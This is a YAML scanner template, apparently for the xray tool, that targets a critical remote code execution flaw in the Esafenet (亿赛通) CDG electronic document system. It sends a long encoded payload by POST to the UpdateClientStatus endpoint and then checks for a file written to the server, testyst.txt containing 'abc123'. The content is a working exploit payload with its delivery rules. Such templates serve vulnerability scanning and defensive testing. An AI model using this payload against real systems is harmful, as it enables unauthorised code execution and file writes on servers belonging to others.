id: esafenet-cdgserver3-updateclientstatus-rce

info:
  name: 亿赛通电子文档系统 UpdateClientStatus RCE
  author: Observer
  severity: critical
  verified: true
  tags: esafenet,rce
  created: 2024/01/31
set:
  payload: "NNLINELBIIKEOGPIFLNMHIPNNOHFNECLEHKBCIHIFHCMONPDPHOHMONIOCNLPBOKNAEEBHFCIFNMDPDAACABKCKIAEMBPOIBGPMNEIPJAOGBILDKMLDGAENLPAFBKFPFELKLGCEBMBMNKOIBMPHCIODCCEHOKPCEDHPNLONIODEGNCPIGDFMGMDPOMMEDIJNFKDCHHBFMFGBDOIOAHLOHNAMDBJABECIJOEHKAPJCBDIDJHKAMAGEELEHJEEIDBDILILANAKCIIGLMDIDDMOPNCNGLPPOMMIGCEFEBIMDHFAGLHIDHPJCHAEHFPHNHJGJKJDCINLAHOAPCDJNIABODKBFABJMFIEMLLPGGKNNNFCAOBHCOEOHCBFOFGBBPLKPHLLNOCJAKJDJPOEPBEKKPHOPBHFLJLNOGLABIJHIBOFFCPCLPAGLCEAONCAGIJFAEFOLKOLENHNFBOJIAOFJKBFMGNKBEECKKJPCECMFKPPPKEGOIOBHIBIBAGBIKAMOFLEKDKODMHGJOCEPEBNIHPFKEKKMCENNPHEODFNIOPMHFPPNFFIJEEJPPIMGPKHDOACKEEJACLCOKIPFHHECFDFJNMIFNGHLCOFLPDACOOALCNKBOEBPNPCKCKNJJJJANLFPKGLOINAIODAJNHAEDLBNONDJHPFELIJMNLMHEMBFGOHELCDBFHIFALDIIMBFEOHNHBOIOMLCJKCPHJPNDLPHDDCFJNMGKDMEINHIDLEGMOCNAFDAHOMPPIFFBPFCHAPPIDAIAILKODLCALBBJNPCGLPKIEOLEOMKEMBLMLBEGKNGCOKOFIPBCFAAHGCIMCAKFFLFIBDHCDFHMKKNDHLCGIMMNKMBJDGIDJMMGEOEGJNJDNNEKFDMEAHMILDKIFBGKGEJCMGOFEKGJEMNAFLDGEEOBKOHADBAMHBMDJOGIFPMDKIILIGAEELNEOAKNEFHDOGHOPBDICEALJIENFKHFCEHMPBJLCFPDHDGBBFIMKHLLFIHONFDJAIEJJLPPFMAEHBHDEBOIDLCMCIKAFBEBFEBGJEECDEINCPNPKIENONIMPBJCCMCHOAJHHDKDKEGJGDGJDJIDEHNNLNNHEONJEJHNLHLPMBBEJDLLJLLNPKIMGHLOFMMKBDEBHNFLPGEOKMHOFNBLLAALGMKNJONNGIOJLBFECJNLKHMBCKELDPBDMBFEHAKBHEMNDFBBEDCAMMHNNGMDGLNJHJDAGPILNGBEDCDJBCJOAMOBIFLOFCFIJKDELPPFLFBOHHENJENKLALAHIMHAGKHBFPIPPKODCBIHLLNKILGHHLLECNLJKJBMEMEDLIAJALJDLCALHCOMMJMEPMHDMAMOJOJCAPGBMMDLDNECINFJNHDJCFMFJHINNOAHKEDGIGEDKHLKLOJBBEAOEEJLCIPFNNNCDLNCKPIBMOMNKOJPMKKAFPEHJOHGDBJIECGDEBHMHGONNEGJADJJBNGBBGNHFODLNJMPJPCHLCECIIHINMAMEOCLMFEBDMFDBEEMAHEMMCEJIAOFIFHMCJGNGGNMIMDMGPNKIOPDEBPMOIGKKBGANBDPKFAIJEBLKONOIFGLAGGJGECCHKPIGDBAMAKFHAKMGKNIMDIEJADGFJICBELNIGMHPJACPFIAOJMGEHFLOIFIIPIPCEKFNMHOEEIIHHICCBODBKEJMOIAGADMKGCFACFIFJAIODGNGPPPHOFJFBBJFNOCPGGNOADOOMKFBLDMIKOKOOBGBPFMPEMLNBKHPBEEEELKPOMJGNOPIMIGJNJIKADAACMEFNBCBKICAALEICBCKEKHPHPHAAEHODBGHHAPANLDCJDAMMEAEDABCGCHGAFKOPHOECCOHFCNLCJPOFMHCLNKFLMMDDAAOAGIPGFMDAKDDJONOCDIKFEBIFBCIOCCDFIDCKEIIHEPPJLACKOGDMIEAOOFFBEHHECJOPEDCKGLAFGGCKGODEFOMKDMPCIBLLMEPICGHFBKKGPGAKNNJLOEHBPBKMLONDFABKBELKEAKJCLNGMBCPCEFHPBLFPDAPJANMGJNIBFCHONDGMLBMNLAMNOJFIFEMDPIBHMIDPPEBLNMPEJFALJFDHIELACGBKPLPMNBILLKAGGJCAFNIEBJAPPDDCENHJGJJFFGCKDAKEINJHHIFBHBMLJFNHNGGJDDEBGHNGMMDGPKMLBJILEPIJOFALHEECHMPKPFKLOLFBGBMDDDEFCOCNALOIJNEGADDNEJKKCENNJHCDKNJNIMOBFAFMPJILCDNLHACAPHPMGNBCHMMGFCMADIGBHGICLGJBGMNLMCPCNGLOHDPPJGHCMGJBBLMDBFENHCHMPGOCLCOIBKEFOADNGIDGBOFLDJIGJMPGPOHCMCPKJEFPFIAPMNEOOBIPJDNPJPOEDEGMANLOPOHOKBCGMPCCPLOBDAMEADCHONAMCFJBFJJPEGGBGLNALFJNCCBMCDHDBAOHHCPLDKGINIOHFPAHDIECHNDKLDDALMDENAINAPFEOGFPHLFDINCIAFMBGDCDLNCINAHKPPIOJNHBDOKOMCDJILCFOKNONFGNBKCNNHHINIEKMNJJADADOPLKACEDHOMGMAAPIJAPBEPLBDINNJGNCABECHPHCFILFMGCOIJBJNPKKCJLBNCOIMJHHFEBFPOMPMDLENFIKKICINADMPOPLGAKCEMAGNLFIHJJIFKIOANKHNAFKGBIMGFIPABDEBCBMGFGNGBBIKGPCGDCNCOHBNAHIMFEICOMPCEDOIIPCHMMOLLKIJKLDMLEILJGIBNIOJLICIAHJFLGONEFGAGPJJBCNMEEDAFEEEFPDPMHHLLMBNMKINLBLNEJFEHLJPKJKOGJGBHKJOILIKLGPJJLDFAKEOLEDKJJKCKHHINEJNKOIAMDPONBEGGHCNJCHJHNDFMNCEHJPGDPJJDADDPAKGANJPENGJNGALGPHHMJBCFNENPBMEGGMJLDELBGMMFOGBFIHLEFDAOLJNAJCMKMJMEFJLLNFBOOFLAJLPGJNEEPOIOLCFIAJPNEPPNHJAPNBAFBLMJNIKPEHKDFLFFFMKLECNLJDIBFFIHILJKJEPNFKFGKEIDOLIJPNBHHPJFBPIHJJAJIOLCGAGBHFJJJHNMEDEFBECCLOELIEAENIOOGDJADMEIHJLGKNFDGNCCEOCBIMPNMLHDCLBHJBDGAGHDHEHFMFLFJKIDMCNLJAFJLPBKHDLKNMPKHPDBDFKJJHICBJJDPPGOGJFDMGMFGHMHPNNDDKBFJBOBBGIGEHEFHLGEMDOAIHADDDNGJNHALLOKCPOEOCBODHIIJFBCEMCIMBNEAKGKOPOHJEBMPOIAMBENLFLCJHNMKKAKKDOHBOLLCAGJCMFHGGMBDNKAOFIPMOPEFHGEDJDIHMIEDJHHIADCIDJFEJMIHMJNPNLIOAIGADIKLDJJMDAEMAHEKLPNPJDIKBAPGEBKJFLJJBJFDKIIFHLHCIKEMHMABMEKKPDDFGNFCLBNLPENBOECIINFNPAMFHADBIKFKMHMAGIEFJDBNMPFEEADKPJHNHNFFDHLOMAPDACAMOEDFCJHOEFENFKBJHOPCHBGKNBHEEILEGMEPACHKDLJGNFFKLJIMMEGLFNGOJCPKCDOEDEPIAFLMCOGLAOELIAMBLFPHAACDPPEABHHHIMCAAMOLLCFLOOANMINFEHKCJEGDEAAIMMAIGPPANMBANPEMLLICNCBMLMIDNENKHBOAAIBJMKOCGKCIJGMHPHOPEHIMICIGNOAIHJMDCMOLHEBCJKKMKNCCHOABOELJNAJFBGBNECOFHFGJPIFPOAAJNBLMKINELGIKFCFAIKFGGLJDNPPLJNBGPDNOKOOFABPFLBNPIDCEEHFJLKMLALDNOHABAOKFHGOIMLMAOFBGIKAEBNHKMNAKPIHNJJIPPBBIFJCIPGFNKBBLLGDOJGBPHKHELACOMFMJBCMEIALEBJEHDFLGPMMCEJIPIBIGGGLAMOKFKMKGJACLLNNHIPONIAFLAPIOIPHFEDAJBBLADFJJPDCDNAGFHNOBFFLHDMHNEFAIPMBJJMIIDAEAJAKGDIHIOIPIOPBJKOLEHJLBIOLGLBMHNCNDAHOGDOILIJANBPNLPPKCOKJFJPCLFJPGKDCBMGEOGGGANMMKDILOMJJLPKJJCOCCHALOOAOKEMIJGCLJNLMLEOMAMLOEDJHKAMBELBKFBCKIFGEBNLCAGJPEIJAAKMJNDBIKBCLPLEEKBJJHOIDFDPNPOJDBBMLCAFDJPPEDFKJHCONBJMAIBFECCPFPGEKECCECFFCOJHGHCHBHBPKDCGMJKHPLOIPLAFCJPDIEFJNGHMDKJHKKBEBOFBACJINKJKIGJKFKGLMLMKDNFMMMNEHPKFGFOILIOGEELJKEHPHOLMDAIPLOILNEEDPCBMLGHCPOKAGNNDIMDGFDCPFOEAAJODNOLGJGJIGDDOBKEIIIOAJOGPLEDEJJPAFNDFKOJJHCKOOKJLPKBDKDNDCMAHHDDHGHIBMGCONOJBEJHAPFAELOAOPHKLMMJAOLPE"
rules:
  r0:
    request:
      method: POST
      path: /CDGServer3/UpdateClientStatus
      headers:
        Content-Type: text/xml
      body: "{{payload}}"
    expression: true
  r1:
    request:
      method: GET
      path: /CDGServer3/testyst.txt
    expression: response.status == 200 && response.body.bcontains(b'abc123')
expression: r0() && r1()
